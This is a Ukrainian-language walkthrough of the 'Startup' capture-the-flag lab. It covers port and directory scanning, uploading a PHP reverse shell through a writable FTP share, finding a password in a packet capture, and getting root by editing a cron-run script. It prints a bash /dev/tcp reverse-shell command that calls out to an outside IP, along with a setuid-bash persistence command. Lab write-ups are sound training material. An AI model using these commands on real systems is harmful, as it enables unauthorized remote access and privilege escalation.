
# Startup - Abuse traditional vulnerabilities via untraditional means. 
Складність: Easy

Ціль: 10.112.153.100

1. Розвідка (Reconnaissance & Enumeration)
   
     1.1. Сканування портів (Nmap):
  
       ` nmap -sC -sV -O -p- -vv 10.112.153.100`
  
      ![nmap scan](./img/nmap_scan.png)
  
     Бачу доступні файли в FTP (також можливість запису в каталог), веб сервер.
  
     1.2. Веб-розвідка:
  
     Запускаю gobuster 
  
     `$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://10.112.153.100 -t 50 -k -x html,txt,php`
  
     ![gobuster](./img/gobuster_common.png)

     ![HTML/files](./img/html_files.png)
  
     Схоже що це файли з FTP.
  
     1.3. Перевіряю FTP:
  
     ![FTP](./img/ftp.png)

     Забираю всі файли та досліджую їх.
  
     ![img](./img/img.png)
  
     ![files 1](./img/files_1.png)
  
     Бачу ім'я 'Maya', записую. `strings` недав якоїсь інформації, тому досліджую картинку далі.
  
     ![files 2](./img/files_2.png)

     Подальше дослідження картинкі нічого не дало, тому повернтаюсь до FTP.
  
2. Точка входу (Initial Access / Foothold)

     2.1. Експлуатація вразливості: 
     Так як я маю права запису в папку FTP, то пробую залити туди файлик для тесту

     ![test](./img/test_lol_1.png)
     ![test](./img/test_lol_2.png)

     2.2. Отримання реверс-шеллу: 
     Після цього пробую залити веб-шелл p0wny взятий з https://www.revshells.com/ , але щось не пішло. Пробую залити звичайний PHP реверс-шелл PentestMonkey та запускаю слухача.
  
     ![web-shell](./img/rev_shell_1.png)
   
     Отримую доступ та стабілізую шелл.

     ![reverse-shell](./img/rev_shell_2.png)

     Забираю перший прапор.
  
     ![LOVE](./img/flag_1.png)

3. Підвищення привілеїв (Privilege Escalation)

     3.1. Горизонтальне переміщення (www-data -> User):
     Переглядаю файли на машині та знаходжу цікавий файл. Переглядаю його.
     `/ftp/ata@startup:/incidents$ cp /incidents/suspicious.pcapng /var/www/html/files`
  
     Дивлюсь файл через `WireShark` та знаходжу щось схоже на пароль.

     ![wireshark](./img/wireshark.png)

     Перевіряю та забираю прапор `user.txt`.
  
     ![user.txt](./img/user_txt.png)

     3.2. Вертикальне підвищення (User -> Root): 
  
     Переглядаючи файли користувача, знаходжу такі скрипти.
  
     ![scripts](./img/scripts_1.png)

     Завантажую `pspy64` та дивлюсь процеси. Трохи чекаю та бачу скрипт `planner.sh`, що запускається від імені `root`.
  
     ![pspy64](./img/pspy.png)
  
     Так я маю права на редагування `print.sh`, це дозволяє мені підняти реверс-шелл з правами `root`, або скопіювати `bash`.
  
     Revers-shell:
     `echo "bash -i >& /dev/tcp/192.168.154.141/4444 0>&1" > /etc/print.sh`

     ![root reverse-shell](./img/root_rev_shell.png)
  
     Bash:
     `echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /etc/print.sh`

     ![rootbash](./img/root_bash.png)

     Забираю прапор `root.txt`.

     ![root.txt](./img/root_txt.png)
  
  
